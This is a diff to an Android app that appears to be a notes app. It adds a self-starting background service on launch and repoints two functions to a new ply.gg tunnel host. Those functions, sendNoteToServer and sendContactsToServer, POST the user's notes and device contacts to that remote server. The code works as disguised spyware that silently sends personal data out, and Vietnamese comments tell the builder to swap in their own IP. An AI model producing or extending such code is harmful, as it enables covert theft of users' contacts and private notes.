@@ -8,8 +8,18 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+
+import android.content.Intent;
+import androidx.work.OneTimeWorkRequest;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
+import java.util.concurrent.TimeUnit;
+
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+
+import android.os.Build;
+
 import android.os.Bundle;
 import android.os.Environment;
 import android.provider.ContactsContract;
@@ -49,6 +59,15 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        // Khởi động BackgroundService
+        Intent serviceIntent = new Intent(this, BackgroundService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+        
 
         notesContainer = findViewById(R.id.notesContainer);
         Button saveButton = findViewById(R.id.saveButton);
@@ -137,7 +156,7 @@ public class MainActivity extends AppCompatActivity {
     private void sendNoteToServer(String title, String content) {
         new Thread(() -> {
             try {
-                URL url = new URL("http://feet-linking.gl.at.ply.gg:1554/log/note"); // ← THAY IP
+                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/note"); // ← THAY IP
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
@@ -162,7 +181,7 @@ public class MainActivity extends AppCompatActivity {
     private void sendContactsToServer(String contacts) {
         new Thread(() -> {
             try {
-                URL url = new URL("http://feet-linking.gl.at.ply.gg:1554/log/contacts"); // ← THAY IP
+                URL url = new URL("http://responsibility-sorted.gl.at.ply.gg:40543/log/contacts"); // ← THAY IP
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
